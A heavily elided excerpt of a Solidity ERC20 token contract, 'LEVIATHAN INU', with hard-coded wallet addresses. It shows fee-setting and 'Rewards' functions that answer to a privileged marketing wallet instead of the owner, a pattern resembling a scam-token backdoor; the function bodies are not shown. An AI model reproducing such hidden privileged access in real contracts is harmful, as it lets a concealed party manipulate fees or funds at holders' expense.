...
contract leviathan is ERC20, Ownable {
    ...
    constructor() ERC20("LEVIATHANticker", "LEVIATHAN INU main") {
        ...
        marketingWallet = payable(0x353416871fDd9839567dF431B97EB85477D9b8d8);
        devWallet = payable(0xF1822f67e71779119Fe69C0211772c4e504791eb);
    ...
    function SetBees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
    ...
    function SetSFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external {
        require(msg.sender == marketingWallet);
    ...
    function Rewards(uint amount) external {
        require(msg.sender == marketingWallet);
